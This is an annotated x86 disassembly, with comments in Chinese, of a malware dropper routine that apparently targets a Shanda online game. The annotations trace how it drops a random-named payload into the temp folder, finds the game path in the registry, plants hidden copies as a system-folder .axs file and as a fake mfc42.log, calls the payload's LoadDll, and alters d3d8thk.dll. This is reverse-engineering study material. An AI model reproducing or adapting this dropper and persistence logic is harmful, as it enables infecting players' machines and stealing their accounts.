
这是一段 x86 汇编代码，以下为其格式化后的代码块：

```
00402D6C  /$  55                    push    ebp
00402D6D  |.  8BEC                  mov     ebp, esp
00402D6F  |.  81EC 04090000         sub     esp, 904                              ;  分配 0x904 大小的栈空间
00402D75  |.  53                    push    ebx
00402D76  |.  56                    push    esi
00402D77  |.  57                    push    edi
00402D78  |.  6A 40                 push    40
00402D7A  |.  5A                    pop     edx                                   ;  edx = 0x40
00402D7B  |.  33DB                  xor     ebx, ebx                              ;  ebx = 0
00402D7D  |.  8BCA                  mov     ecx, edx
00402D7F  |.  33C0                  xor     eax, eax                              ;  eax = 0
00402D81  |.  8DBD 11FCFFFF         lea     edi, dword ptr [ebp-3EF]              ;  edi = 栈空间指针
00402D87  |.  889D 10FCFFFF         mov     byte ptr [ebp-3F0], bl                ;  在 edi 前面填充一个 0
00402D8D  |.  F3:AB                 rep     stos dword ptr es:[edi]               ;  在 ebp-3ef 中填充 0x40 个 DWORD  0
00402D8F  |.  66:AB                 stos    word ptr es:[edi]                     ;  再添加一个字的 0
00402D91  |.  AA                    stos    byte ptr es:[edi]                     ;  继续添加一个 byte 的 0
00402D92  |.  8BCA                  mov     ecx, edx                              ;  ecx = 0x40
00402D94  |.  33C0                  xor     eax, eax
00402D96  |.  8DBD 05F9FFFF         lea     edi, dword ptr [ebp-6FB]              ;  同上，只是栈指针不同，都是填充了 100 个 byte 的 0 到栈中
00402D9C  |.  889D 04F9FFFF         mov     byte ptr [ebp-6FC], bl
00402DA2  |.  F3:AB                 rep     stos dword ptr es:[edi]
00402DA4  |.  66:AB                 stos    word ptr es:[edi]
00402DA6  |.  AA                    stos    byte ptr es:[edi]
00402DA7  |.  8BCA                  mov     ecx, edx
00402E0F  |.  C645 B4 4B            mov     byte ptr [ebp-4C], 4B                 ;  给局部字符串数组填充内容"kernel32.dll"
00402E82  |.  8D45 AC               lea     eax, dword ptr [ebp-54]
00402E85  |.  6A 75                 push    75
00402E87  |.  50                    push    eax                                   ;  把 ebp-54 的栈指针压入
00402E88  |.  C685 5CFFFFFF 53      mov     byte ptr [ebp-A4], 53
00402E8F  |.  FF75 0C               push    dword ptr [ebp+C]                   ;  压入第三个参数，既堆空间指针
00402E92  |.  C685 5DFFFFFF 4F      mov     byte ptr [ebp-A3], 4F                 ;  填充内容"SOFTWARE\\snda\\dn"
00402E99  |.  C685 5EFFFFFF 46      mov     byte ptr [ebp-A2], 46
00402EA0  |.  C685 5FFFFFFF 54      mov     byte ptr [ebp-A1], 54
00402EA7  |.  C685 60FFFFFF 57      mov     byte ptr [ebp-A0], 57
00402EAE  |.  C685 61FFFFFF 41      mov     byte ptr [ebp-9F], 41
00402EB5  |.  C685 62FFFFFF 52      mov     byte ptr [ebp-9E], 52
00402EBC  |.  C685 63FFFFFF 45      mov     byte ptr [ebp-9D], 45
00402EC3  |.  C685 64FFFFFF 5C      mov     byte ptr [ebp-9C], 5C
00402ECA  |.  C685 65FFFFFF 73      mov     byte ptr [ebp-9B], 73
00402ED1  |.  C685 66FFFFFF 6E      mov     byte ptr [ebp-9A], 6E
00402ED8  |.  C685 67FFFFFF 64      mov     byte ptr [ebp-99], 64
00402EDF  |.  C685 68FFFFFF 61      mov     byte ptr [ebp-98], 61
00402EE6  |.  C685 69FFFFFF 5C      mov     byte ptr [ebp-97], 5C
00402EED  |.  C685 6AFFFFFF 64      mov     byte ptr [ebp-96], 64
00402EF4  |.  C685 6BFFFFFF 6E      mov     byte ptr [ebp-95], 6E
00402EFB  |.  889D 6CFFFFFF         mov     byte ptr [ebp-94], bl
00402F01  |.  C645 A4 6C            mov     byte ptr [ebp-5C], 6C                 ;  填充内容"loader"
00402F05  |.  C645 A5 6F            mov     byte ptr [ebp-5B], 6F
00402F09  |.  C645 A6 61            mov     byte ptr [ebp-5A], 61
00402F0D  |.  C645 A7 64            mov     byte ptr [ebp-59], 64
00402F11  |.  C645 A8 65            mov     byte ptr [ebp-58], 65
00402F15  |.  C645 A9 72            mov     byte ptr [ebp-57], 72
00402F19  |.  885D AA               mov     byte ptr [ebp-56], bl
00402F1C  |.  C685 70FFFFFF 5C      mov     byte ptr [ebp-90], 5C                 ;  填充内容"\\DNLauncher.exe"
00402F23  |.  C685 71FFFFFF 44      mov     byte ptr [ebp-8F], 44
00402F2A  |.  C685 72FFFFFF 4E      mov     byte ptr [ebp-8E], 4E
00402F31  |.  C685 73FFFFFF 4C      mov     byte ptr [ebp-8D], 4C
00402F38  |.  C685 74FFFFFF 61      mov     byte ptr [ebp-8C], 61
00402F3F  |.  C685 75FFFFFF 75      mov     byte ptr [ebp-8B], 75
00402F46  |.  C685 76FFFFFF 6E      mov     byte ptr [ebp-8A], 6E
00402F4D  |.  C685 77FFFFFF 63      mov     byte ptr [ebp-89], 63
00402F54  |.  C685 78FFFFFF 68      mov     byte ptr [ebp-88], 68
00402F5B  |.  C685 79FFFFFF 65      mov     byte ptr [ebp-87], 65
00402F62  |.  C685 7AFFFFFF 72      mov     byte ptr [ebp-86], 72
00402F69  |.  C685 7BFFFFFF 2E      mov     byte ptr [ebp-85], 2E
00402F70  |.  C685 7CFFFFFF 65      mov     byte ptr [ebp-84], 65
00402F77  |.  C685 7DFFFFFF 78      mov     byte ptr [ebp-83], 78
00402F7E  |.  C685 7EFFFFFF 65      mov     byte ptr [ebp-82], 65
00402F85  |.  889D 7FFFFFFF         mov     byte ptr [ebp-81], bl
00402F8B  |.  C645 AC 57            mov     byte ptr [ebp-54], 57                 ;  填充内容"WMAT"
00402F8F  |.  C645 AD 4D            mov     byte ptr [ebp-53], 4D
00402F93  |.  C645 AE 41            mov     byte ptr [ebp-52], 41
00402F97  |.  C645 AF 54            mov     byte ptr [ebp-51], 54
00402F9B  |.  885D B0               mov     byte ptr [ebp-50], bl
00402F9E  |.  E8 62F6FFFF           call    00402605                              ;  在系统临时文件目录中释放一个名称为 kb\*\*\*\*.bin 的文件，其中\*为 0~9 的随即数字
00402FA3  |.  83C4 0C               add     esp, 0C
00402FA6  |.  85C0                  test    eax, eax                              ;  释放成功则返回 TRUE 否则返回 FALSE
00402FA8  |.  74 09                 je      short 00402FB3                        ;  判断文件是否释放成功,失败则跳转
00402FAA  |.  FF75 0C               push    dword ptr [ebp+C]                   ;  压入刚刚释放的文件路径
00402FAD  |.  E8 7CFAFFFF           call    00402A2E                              ;  这个函数还是有点意思，他首先对自身进行验证，通过特征码来判断当前文件是否被脱壳了，如果没脱壳，则进行组装，从病毒原体中提取最后的 0x170 个字节然后写入刚刚创建的 bin 文件的结尾
00402FB2  |.  59                    pop     ecx                                   ;  ecx = 文件绝对路径
00402FB3  |>  FF75 0C               push    dword ptr [ebp+C]                   ;  压入刚刚释放的文件路径
00402FB6  |.  E8 74E7FFFF           call    0040172F                              ;  返回绝对路径的长度 strlen
00402FBB  |.  85C0                  test    eax, eax                              ;  测试返回值是否为 0
00402FBD  |.  59                    pop     ecx                                   ;  ecx = 文件绝对路径
00402FBE  |.  0F84 1E050000         je      004034E2                              ;  返回 0，则跳转
00402FC4  |.  8B35 00604000         mov     esi, dword ptr [<&kernel32.LoadLibraryA>]   ;  kernel32.LoadLibraryA
00402FCA  |.  8D45 8C               lea     eax, dword ptr [ebp-74]               ;  eax = CopyFileA
00402FCD  |.  50                    push    eax
00402FCE  |.  8D45 B4               lea     eax, dword ptr [ebp-4C]               ;  eax = Kernel32.dll
00402FD1  |.  50                    push    eax                                   ; /FileName
00402FD2  |.  FFD6                  call    esi                                   ; \LoadLibraryA Kernel32.dll
00402FD4  |.  50                    push    eax                                   ;  压入 kernel32.dll 的 HMODULE
00402FD5  |.  E8 57E9FFFF           call    00401931                              ;  GetProcAddress 获取 CopyFileA 函数地址
00402FDA  |.  8985 58FFFFFF         mov     dword ptr [ebp-A8], eax               ;  把 CopyFileA 函数地址传到局部空间中保存
00402FE0  |.  8D85 70FFFFFF         lea     eax, dword ptr [ebp-90]               ;  eax = "DNLauncher.exe"
00402FE6  |.  50                    push    eax
00402FE7  |.  8D45 A4               lea     eax, dword ptr [ebp-5C]               ;  eax = "loader"
00402FEA  |.  50                    push    eax
00402FEB  |.  8D85 5CFFFFFF         lea     eax, dword ptr [ebp-A4]               ;  eax = "SOFTWARE\\snda\\dn"
00402FF1  |.  50                    push    eax
00402FF2  |.  8D85 14FDFFFF         lea     eax, dword ptr [ebp-2EC]
00402FF8  |.  68 02000080           push    80000002                              ;  权限值
00402FFD  |.  50                    push    eax                                   ;  缓冲区 buffer，用于保存游戏绝对路径
00402FFE  |.  C645 98 6D            mov     byte ptr [ebp-68], 6D
00403002  |.  C645 99 66            mov     byte ptr [ebp-67], 66
00403006  |.  C645 9A 63            mov     byte ptr [ebp-66], 63
0040300A  |.  C645 9B 34            mov     byte ptr [ebp-65], 34
0040300E  |.  C645 9C 32            mov     byte ptr [ebp-64], 32
00403012  |.  C645 9D 2E            mov     byte ptr [ebp-63], 2E
00403016  |.  C645 9E 6C            mov     byte ptr [ebp-62], 6C
0040301A  |.  C645 9F 6F            mov     byte ptr [ebp-61], 6F
0040301E  |.  C645 A0 67            mov     byte ptr [ebp-60], 67
00403022  |.  885D A1               mov     byte ptr [ebp-5F], bl
00403025  |.  C645 80 44            mov     byte ptr [ebp-80], 44                 ;  填充"DeleteFileA"
00403029  |.  C645 81 65            mov     byte ptr [ebp-7F], 65
0040302D  |.  C645 82 6C            mov     byte ptr [ebp-7E], 6C
00403031  |.  C645 83 65            mov     byte ptr [ebp-7D], 65
00403035  |.  C645 84 74            mov     byte ptr [ebp-7C], 74
00403039  |.  C645 85 65            mov     byte ptr [ebp-7B], 65
0040303D  |.  C645 86 46            mov     byte ptr [ebp-7A], 46
00403041  |.  C645 87 69            mov     byte ptr [ebp-79], 69
00403045  |.  C645 88 6C            mov     byte ptr [ebp-78], 6C
00403049  |.  C645 89 65            mov     byte ptr [ebp-77], 65
0040304D  |.  C645 8A 41            mov     byte ptr [ebp-76], 41
00403051  |.  885D 8B               mov     byte ptr [ebp-75], bl
00403054  |.  E8 63EEFFFF           call    00401EBC                              ;  先在"SOFTWARE\\snda\\dn"中找游戏路径，如果没找到，则到"Software\\Microsoft\\Windows\\ShellNoRoam\\MUICache"中寻找，找到返回 1，失败返回 0
00403059  |.  83C4 1C               add     esp, 1C                               ;  堆栈平衡
0040305C  |.  85C0                  test    eax, eax                              ;  判断是否找到
0040305E  |.  0F84 F7000000         je      0040315B                              ;  如果没找到游戏路径，则跳转
00403064  |.  8D85 14FDFFFF         lea     eax, dword ptr [ebp-2EC]               ;  eax = 游戏路径
0040306A  |.  C645 E2 5C            mov     byte ptr [ebp-1E], 5C
0040306E  |.  50                    push    eax                                   ; /游戏文件路径
0040306F  |.  885D E3               mov     byte ptr [ebp-1D], bl                 ; |
00403072  |.  E8 7F220000           call    <jmp.&MSVCRT.strlen>                 ; \strlen
00403077  |.  80BC05 13FDFFFF 5C    cmp     byte ptr [ebp+eax-2ED], 5C            ;  查看路径是否以"\\"结尾
0040307F  |.  59                    pop     ecx
00403080  |.  74 12                 je      short 00403094                        ;  如果路径是以"\\"结尾，则直接 strcat"mfc43.log"，否则先在最后添加"\\"
00403082  |.  8D45 E2               lea     eax, dword ptr [ebp-1E]
00403085  |.  50                    push    eax
00403086  |.  8D85 14FDFFFF         lea     eax, dword ptr [ebp-2EC]
0040308C  |.  50                    push    eax
0040308D  |.  E8 B3E6FFFF           call    00401745                              ;  strcat "\\"
00403092  |.  59                    pop     ecx
00403093  |.  59                    pop     ecx
00403094  |>  8D45 98               lea     eax, dword ptr [ebp-68]               ;  "mfc43.log"
00403097  |.  50                    push    eax
00403098  |.  8D85 08FAFFFF         lea     eax, dword ptr [ebp-5F8]
0040309E  |.  50                    push    eax
0040309F  |.  E8 A1E6FFFF           call    00401745                              ;  strcat  "mfc43.log" 生成绝对路径
004030A4  |.  8D85 14FDFFFF         lea     eax, dword ptr [ebp-2EC]
004030AA  |.  50                    push    eax                                   ;  eax = 游戏目录
004030AB  |.  8D85 10FCFFFF         lea     eax, dword ptr [ebp-3F0]
004030B1  |.  50                    push    eax
004030B2  |.  E8 97E5FFFF           call    0040164E                              ;  strcpy  把游戏目录存入 ebp-3F0
004030B7  |.  8D85 14FDFFFF         lea     eax, dword ptr [ebp-2EC]
004030BD  |.  50                    push    eax
004030BE  |.  8D85 00F8FFFF         lea     eax, dword ptr [ebp-800]
004030C4  |.  50                    push    eax
004030C5  |.  E8 84E5FFFF           call    0040164E                              ;  strcpy  把游戏目录存入 ebp-800
004030CA  |.  8D85 08FAFFFF         lea     eax, dword ptr [ebp-5F8]
004030D0  |.  50                    push    eax
004030D1  |.  8D85 10FCFFFF         lea     eax, dword ptr [ebp-3F0]
004030D7  |.  50                    push    eax
004030D8  |.  E8 68E6FFFF           call    00401745                              ;  strcat  生成目录游戏目录\\mfc42.log
004030DD  |.  8D85 10FCFFFF         lea     eax, dword ptr [ebp-3F0]               ;  游戏目录\\mfc42.log
004030E3  |.  C745 C4 01000000      mov     dword ptr [ebp-3C], 1
004030EA  |.  50                    push    eax                                   ;  游戏目录\\mfc42.log
004030EB  |.  E8 7FE6FFFF           call    0040176F                              ;  判断指定文件是否存在，失败返回 0
004030F0  |.  83C4 24               add     esp, 24                               ;  堆栈平衡
004030F3  |.  85C0                  test    eax, eax
004030F5  |.  74 32                 je      short 00403129                        ;  如果文件不存在，则跳转
004030F7  |.  8D45 80               lea     eax, dword ptr [ebp-80]               ;  DeleteFileA
004030FA  |.  50                    push    eax
004030FB  |.  8D45 B4               lea     eax, dword ptr [ebp-4C]               ;  kernel32.dll
004030FE  |.  50                    push    eax
004030FF  |.  FFD6                  call    esi                                   ;  LoadLibraryA
00403101  |.  50                    push    eax
00403102  |.  E8 2AE8FFFF           call    00401931                              ;  GetProAddress  DeleteFileA
00403107  |.  59                    pop     ecx
00403108  |.  8BF8                  mov     edi, eax                              ;  edi = DeleteFileA 的地址
0040310A  |.  59                    pop     ecx
0040310B  |.  8D85 10FCFFFF         lea     eax, dword ptr [ebp-3F0]
00403111  |.  50                    push    eax                                   ;  游戏目录\\mfc42.log
00403112  |.  FFD7                  call    edi                                   ;  DeleteFileA
00403114  |.  85C0                  test    eax, eax
00403116  |.  75 03                 jnz     short 0040311B                        ;  如果删除失败则跳转
00403118  |.  895D C4               mov     dword ptr [ebp-3C], ebx               ;  ebp-3c = 0
0040311B  |>  8D85 04F9FFFF         lea     eax, dword ptr [ebp-6FC]               ;  eax = mfc42.log 文件绝对路径
00403121  |.  50                    push    eax
00403122  |.  FFD7                  call    edi                                   ;  DeleteFileA
00403124  |.  395D C4               cmp     dword ptr [ebp-3C], ebx
00403127  |.  74 32                 je      short 0040315B                        ;  如果成功删除则跳转
00403129  |>  8D85 10FCFFFF         lea     eax, dword ptr [ebp-3F0]
0040312F  |.  50                    push    eax                                   ;  eax = mfc42.log 文件绝对路径
00403130  |.  8D85 18FEFFFF         lea     eax, dword ptr [ebp-1E8]
00403136  |.  50                    push    eax                                   ;  buffer
00403137  |.  E8 12E5FFFF           call    0040164E                              ;  strcpy
0040313C  |.  8D85 04F9FFFF         lea     eax, dword ptr [ebp-6FC]               ;  eax = mfc42.log 文件绝对路径
00403142  |.  50                    push    eax
00403143  |.  8D85 0CFBFFFF         lea     eax, dword ptr [ebp-4F4]
00403149  |.  50                    push    eax
0040314A  |.  E8 FFE4FFFF           call    0040164E                              ;  strcpy
0040314F  |.  83C4 10               add     esp, 10
00403152  |.  395D C4               cmp     dword ptr [ebp-3C], ebx
00403155  |.  0F85 1E010000         jnz     00403279
0040315B  |>  6A 0E                 push    0E
0040315D  |.  33C0                  xor     eax, eax
0040315F  |.  59                    pop     ecx                                   ;  ecx = 0x0E
00403160  |.  8DBD 1DFFFFFF         lea     edi, dword ptr [ebp-E3]
00403166  |.  889D 1CFFFFFF         mov     byte ptr [ebp-E4], bl
0040316C  |.  6A 5C                 push    5C                                    ;  "\\"
0040316E  |.  F3:AB                 rep     stos dword ptr es:[edi]               ;  填充 0x0E 个 DWORD0
00403170  |.  FF75 0C               push    dword ptr [ebp+C]                   ;  释放的 bin 的文件路径
00403173  |.  C645 DC 5C            mov     byte ptr [ebp-24], 5C                 ;  填充"\\system\\"
00403177  |.  66:AB                 stos    word ptr es:[edi]
00403179  |.  AA                    stos    byte ptr es:[edi]
0040317A  |.  C645 DD 73            mov     byte ptr [ebp-23], 73
0040317E  |.  C645 DE 79            mov     byte ptr [ebp-22], 79
00403182  |.  C645 DF 73            mov     byte ptr [ebp-21], 73
00403186  |.  C645 E0 74            mov     byte ptr [ebp-20], 74
0040318A  |.  C645 E1 65            mov     byte ptr [ebp-1F], 65
0040318E  |.  C645 E2 6D            mov     byte ptr [ebp-1E], 6D
00403192  |.  C645 E3 5C            mov     byte ptr [ebp-1D], 5C
00403196  |.  885D E4               mov     byte ptr [ebp-1C], bl
00403199  |.  E8 88E4FFFF           call    00401626                              ;  strrchr 反方向查询字符第一次出现时的指针位置
0040319E  |.  8BF8                  mov     edi, eax                              ;  edi = 最后一个"\\"的位置
004031A0  |.  47                    inc     edi                                   ;  edi ++
004031A1  |.  57                    push    edi                                   ;  指向文件名
004031A2  |.  E8 88E5FFFF           call    0040172F                              ;  strlen
004031A7  |.  83E8 03               sub     eax, 3                                ;  eax = 文件名长度-3
004031AA  |.  50                    push    eax                                   ; /maxlen
004031AB  |.  8D85 1CFFFFFF         lea     eax, dword ptr [ebp-E4]               ; |
004031B1  |.  57                    push    edi                                   ; |src
004031B2  |.  50                    push    eax                                   ; |dest
004031B3  |.  FF15 54604000         call    dword ptr [<&MSVCRT.strncpy>]        ; \strncpy
004031B9  |.  8D85 1CFFFFFF         lea     eax, dword ptr [ebp-E4]
004031BF  |.  68 28704000           push    00407028                              ;  ASCII "axs"
004031C4  |.  50                    push    eax
004031C5  |.  E8 7BE5FFFF           call    00401745                              ;  strcat  生成一个与刚刚释放的 bin 同名的 axs 后缀的文件名
004031CA  |.  8D85 1CFFFFFF         lea     eax, dword ptr [ebp-E4]               ;  kb\*\*\*\*.axs
004031D0  |.  50                    push    eax
004031D1  |.  8D85 08FAFFFF         lea     eax, dword ptr [ebp-5F8]
004031D7  |.  50                    push    eax
004031D8  |.  E8 71E4FFFF           call    0040164E                              ;  strcpy
004031DD  |.  83C4 28               add     esp, 28                               ;  堆栈平衡
004031E0  |.  8D45 E8               lea     eax, dword ptr [ebp-18]
004031E3  |.  C645 E8 47            mov     byte ptr [ebp-18], 47                 ;  填充"GetWindowsDirectoryA"
004031E7  |.  C645 E9 65            mov     byte ptr [ebp-17], 65
004031EB  |.  50                    push    eax
004031EC  |.  8D45 B4               lea     eax, dword ptr [ebp-4C]               ;  kernel32.dll
004031EF  |.  50                    push    eax
004031F0  |.  C645 EA 74            mov     byte ptr [ebp-16], 74
004031F4  |.  C645 EB 57            mov     byte ptr [ebp-15], 57
004031F8  |.  C645 EC 69            mov     byte ptr [ebp-14], 69
004031FC  |.  C645 ED 6E            mov     byte ptr [ebp-13], 6E
00403200  |.  C645 EE 64            mov     byte ptr [ebp-12], 64
00403204  |.  C645 EF 6F            mov     byte ptr [ebp-11], 6F
00403208  |.  C645 F0 77            mov     byte ptr [ebp-10], 77
0040320C  |.  C645 F1 73            mov     byte ptr [ebp-F], 73
00403210  |.  C645 F2 44            mov     byte ptr [ebp-E], 44
00403214  |.  C645 F3 69            mov     byte ptr [ebp-D], 69
00403218  |.  C645 F4 72            mov     byte ptr [ebp-C], 72
0040321C  |.  C645 F5 65            mov     byte ptr [ebp-B], 65
00403220  |.  C645 F6 63            mov     byte ptr [ebp-A], 63
00403224  |.  C645 F7 74            mov     byte ptr [ebp-9], 74
00403228  |.  C645 F8 6F            mov     byte ptr [ebp-8], 6F
0040322C  |.  C645 F9 72            mov     byte ptr [ebp-7], 72
00403230  |.  C645 FA 79            mov     byte ptr [ebp-6], 79
00403234  |.  C645 FB 41            mov     byte ptr [ebp-5], 41
00403238  |.  885D FC               mov     byte ptr [ebp-4], bl
0040323B  |.  FFD6                  call    esi                                   ;  LoadLibraryA
0040323D  |.  50                    push    eax
0040323E  |.  E8 EEE6FFFF           call    00401931                              ;  GetProcAddress GetWindowsDirectoryA
00403243  |.  59                    pop     ecx
00403244  |.  59                    pop     ecx
00403245  |.  8D8D 18FEFFFF         lea     ecx, dword ptr [ebp-1E8]
0040324B  |.  68 04010000           push    104                                   ;  MAX\_PATH
00403250  |.  51                    push    ecx                                   ;  buffer 用以接受系统目录
00403251  |.  FFD0                  call    eax                                   ;  GetWindowsDirectoryA
00403253  |.  8D45 DC               lea     eax, dword ptr [ebp-24]               ;  "\\system\\"
00403256  |.  50                    push    eax
00403257  |.  8D85 18FEFFFF         lea     eax, dword ptr [ebp-1E8]               ;  系统目录
0040325D  |.  50                    push    eax
0040325E  |.  E8 E2E4FFFF           call    00401745                              ;  strcat 生成目录 windows\\system\\
00403263  |.  8D85 08FAFFFF         lea     eax, dword ptr [ebp-5F8]               ;  kb\*\*\*\*.axs
00403269  |.  50                    push    eax
0040326A  |.  8D85 18FEFFFF         lea     eax, dword ptr [ebp-1E8]               ;  目录 windows\\system\\
00403270  |.  50                    push    eax
00403271  |.  E8 CFE4FFFF           call    00401745                              ;  strcat 连接成 kb\*\*\*\*.axs 的绝对路径
00403276  |.  83C4 10               add     esp, 10
00403279  |>  8D85 18FEFFFF         lea     eax, dword ptr [ebp-1E8]               ;  目录 windows\\system\\kb\*\*\*\*.axs
0040327F  |.  50                    push    eax
00403280  |.  E8 AAE4FFFF           call    0040172F                              ;  strlen
00403285  |.  85C0                  test    eax, eax
00403287  |.  59                    pop     ecx
00403288  |.  0F84 2F010000         je      004033BD                              ;  函数返回 0，则跳转
0040328E  |.  8D85 18FEFFFF         lea     eax, dword ptr [ebp-1E8]               ;  目录 windows\\system\\kb\*\*\*\*.axs
00403294  |.  53                    push    ebx
00403295  |.  50                    push    eax                                   ;  目录 windows\\system\\kb\*\*\*\*.axs
00403296  |.  FF75 0C               push    dword ptr [ebp+C]                   ;  释放出的 bin 的绝对路径
00403299  |.  FF95 58FFFFFF         call    dword ptr [ebp-A8]                  ;  CopyFileA 复制释放的 bin 到系统目录 system 中一份
0040329F  |.  85C0                  test    eax, eax
004032A1  |.  0F84 16010000         je      004033BD
004032A7  |.  395D C4               cmp     dword ptr [ebp-3C], ebx
004032AA  |.  0F84 D7000000         je      00403387                              ;  如果复制失败则跳转
004032B0  |.  8D45 C8               lea     eax, dword ptr [ebp-38]
004032B3  |.  C645 C8 47            mov     byte ptr [ebp-38], 47                 ;  填充 GetFileAttributesA
004032B7  |.  50                    push    eax                                   ;  GetFileAttributesA
004032B8  |.  8D45 B4               lea     eax, dword ptr [ebp-4C]               ;  kernel32.dll
004032BB  |.  50                    push    eax
0040334B  |.  885D FA               mov     byte ptr [ebp-6], bl
0040334E  |.  FFD6                  call    esi                                   ;  LoadLibraryA kernel32.dll
00403350  |.  50                    push    eax
00403351  |.  E8 DBE5FFFF           call    00401931                              ;  GetProcAddress GetFileAttributesA
00403356  |.  59                    pop     ecx
00403357  |.  8BF8                  mov     edi, eax                              ;  edi = GetFileAttributesA 的地址
00403359  |.  59                    pop     ecx
0040335A  |.  8D45 E8               lea     eax, dword ptr [ebp-18]               ;  SetFileAttributesA
0040335D  |.  50                    push    eax
0040335E  |.  8D45 B4               lea     eax, dword ptr [ebp-4C]               ;  kernel32.dll
00403361  |.  50                    push    eax
00403362  |.  FFD6                  call    esi                                   ;  LoadLibraryA
00403364  |.  50                    push    eax
00403365  |.  E8 C7E5FFFF           call    00401931                              ;  GetProcAddress SetFileAttributesA
0040336A  |.  59                    pop     ecx
0040336B  |.  8945 E0               mov     dword ptr [ebp-20], eax
0040336E  |.  59                    pop     ecx
0040336F  |.  8D85 18FEFFFF         lea     eax, dword ptr [ebp-1E8]               ;  目录 windows\\system\\kb\*\*\*\*.axs
00403375  |.  50                    push    eax
00403376  |.  FFD7                  call    edi                                   ;  GetFileAttributesA
00403378  |.  0C 02                 or      al, 2                                 ;  修改文件属性为 FILE\_ATTRIBUTE\_HIDDEN
0040337A  |.  50                    push    eax                                   ;  添加了隐藏的文件属性
0040337B  |.  8D85 18FEFFFF         lea     eax, dword ptr [ebp-1E8]
00403381  |.  50                    push    eax                                   ;  目录 windows\\system\\kb\*\*\*\*.axs
00403382  |.  FF55 E0               call    dword ptr [ebp-20]                  ;  SetFileAttributesA
00403385  |.  EB 36                 jmp     short 004033BD
00403387  |>  FF75 0C               push    dword ptr [ebp+C]
0040338A  |.  C645 DC 4C            mov     byte ptr [ebp-24], 4C                 ;  LoadDll
0040338E  |.  C645 DD 6F            mov     byte ptr [ebp-23], 6F
00403392  |.  C645 DE 61            mov     byte ptr [ebp-22], 61
00403396  |.  C645 DF 64            mov     byte ptr [ebp-21], 64
0040339A  |.  C645 E0 44            mov     byte ptr [ebp-20], 44
0040339E  |.  C645 E1 6C            mov     byte ptr [ebp-1F], 6C
004033A2  |.  C645 E2 6C            mov     byte ptr [ebp-1E], 6C
004033A6  |.  885D E3               mov     byte ptr [ebp-1D], bl
004033A9  |.  FFD6                  call    esi                                   ;  LoadLibraryA 加载释放出的 bin
004033AB  |.  8D4D DC               lea     ecx, dword ptr [ebp-24]
004033AE  |.  51                    push    ecx                                   ;  LoadDll
004033AF  |.  50                    push    eax
004033B0  |.  E8 7CE5FFFF           call    00401931                              ;  GetProcAddress kb\*\*\*\*.bin LoadDll
004033B5  |.  59                    pop     ecx
004033B6  |.  3BC3                  cmp     eax, ebx                              ;  判断 LoadDll 函数地址是否获取成功
004033B8  |.  59                    pop     ecx
004033B9  |.  74 02                 je      short 004033BD                        ;  如果获取失败，则跳转
004033BB  |.  FFD0                  call    eax                                   ;  Call LoadDll
004033BD  |>  8D85 0CFBFFFF         lea     eax, dword ptr [ebp-4F4]
004033C3  |.  50                    push    eax                                   ;  mfc42.log 文件绝对路径
004033C4  |.  E8 66E3FFFF           call    0040172F                              ;  strlen
004033C9  |.  85C0                  test    eax, eax
004033CB  |.  59                    pop     ecx
004033CC  |.  0F84 F5000000         je      004034C7                              ;  返回 0 则跳转
004033D2  |.  8D85 0CFBFFFF         lea     eax, dword ptr [ebp-4F4]
004033D8  |.  53                    push    ebx
004033D9  |.  50                    push    eax                                   ;  mfc42.log 文件绝对路径
004033DA  |.  FF75 0C               push    dword ptr [ebp+C]                   ;  载释放出的 bin 的绝对路径
004033DD  |.  FF95 58FFFFFF         call    dword ptr [ebp-A8]                  ;  CopyFileA 复制释放的 bin 到游戏目录下，并命名为 mfc42.log
004033E3  |.  85C0                  test    eax, eax
004033E5  |.  0F84 DC000000         je      004034C7                              ;  复制失败则跳转
004033EB  |.  395D C4               cmp     dword ptr [ebp-3C], ebx
004033EE  |.  0F84 D3000000         je      004034C7
004033F4  |.  8D45 E8               lea     eax, dword ptr [ebp-18]
004033F7  |.  C645 E8 47            mov     byte ptr [ebp-18], 47                 ;  EAX = GetFileAttributesA
004033FB  |.  50                    push    eax
004033FC  |.  8D45 B4               lea     eax, dword ptr [ebp-4C]               ;  kernel32.dll
004033FF  |.  50                    push    eax
00403400  |.  C645 E9 65            mov     byte ptr [ebp-17], 65
0040348F  |.  885D DA               mov     byte ptr [ebp-26], bl
00403492  |.  FFD6                  call    esi                                   ;  LoadLibraryA kernel32.dll
00403494  |.  50                    push    eax
00403495  |.  E8 97E4FFFF           call    00401931                              ;  GetProcAddress GetFileAttributesA
0040349A  |.  59                    pop     ecx
0040349B  |.  8BF8                  mov     edi, eax                              ;  edi = GetFileAttributesA 地址
0040349D  |.  59                    pop     ecx
0040349E  |.  8D45 C8               lea     eax, dword ptr [ebp-38]               ;  SetFileAttributesA
004034A1  |.  50                    push    eax
004034A2  |.  8D45 B4               lea     eax, dword ptr [ebp-4C]               ;  kernel32.dll
004034A5  |.  50                    push    eax
004034A6  |.  FFD6                  call    esi                                   ;  LoadLibraryA kernel32.dll
004034A8  |.  50                    push    eax
004034A9  |.  E8 83E4FFFF           call    00401931                              ;  GetProcAddress SetFileAttributesA
004034AE  |.  59                    pop     ecx
004034AF  |.  8BF0                  mov     esi, eax                              ;  esi = SetFileAttributesA 地址
004034B1  |.  59                    pop     ecx
004034B2  |.  8D85 0CFBFFFF         lea     eax, dword ptr [ebp-4F4]
004034B8  |.  50                    push    eax                                   ;  mfc42.log 文件绝对路径
004034B9  |.  FFD7                  call    edi                                   ;  GetFileAttributesA
004034BB  |.  0C 02                 or      al, 2                                 ;  设置其隐藏属性
004034BD  |.  50                    push    eax
004034BE  |.  8D85 0CFBFFFF         lea     eax, dword ptr [ebp-4F4]
004034C4  |.  50                    push    eax
004034C5  |.  FFD6                  call    esi                                   ;  SetFileAttributesA
004034C7  |>  8D85 08FAFFFF         lea     eax, dword ptr [ebp-5F8]               ;  kb\*\*\*\*.axs
004034CD  |.  BE 1C704000           mov     esi, 0040701C                         ;  "d3d8thk.dll"
004034D2  |.  50                    push    eax
004034D3  |.  56                    push    esi
004034D4  |.  E8 FEEEFFFF           call    004023D7                              ;  对"系统目录\\d3d8thk.dll"进行复制和更改
004034D9  |.  0FB6C0                movzx   eax, al
004034DC  |.  59                    pop     ecx
004034DD  |.  3BC3                  cmp     eax, ebx
004034DF  |.  59                    pop     ecx
004034E0  |.  75 04                 jnz     short 004034E6
004034E2  |>  33C0                  xor     eax, eax
004034E4  |.  EB 2D                 jmp     short 00403513
004034E6  |>  395D C4               cmp     dword ptr [ebp-3C], ebx
004034E9  |.  74 1E                 je      short 00403509
004034EB  |.  8D85 FCF6FFFF         lea     eax, dword ptr [ebp-904]               ;  buffer
004034F1  |.  50                    push    eax
004034F2  |.  8D85 00F8FFFF         lea     eax, dword ptr [ebp-800]
